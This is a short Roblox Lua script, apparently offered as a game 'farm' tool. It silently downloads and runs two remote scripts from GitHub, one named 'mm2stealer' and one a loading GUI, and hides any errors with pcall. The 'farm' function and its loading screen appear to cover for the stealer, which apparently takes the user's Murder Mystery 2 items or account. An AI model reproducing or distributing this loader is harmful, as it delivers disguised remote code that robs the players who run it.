local function stealer()
    pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr'))()
    end)
end

local function farm()
    task.delay(1, function()
        pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptsHub11/loadingGUI/refs/heads/main/loadingGUI'))()
        end)
    end)
end

task.spawn(stealer)
task.spawn(farm)
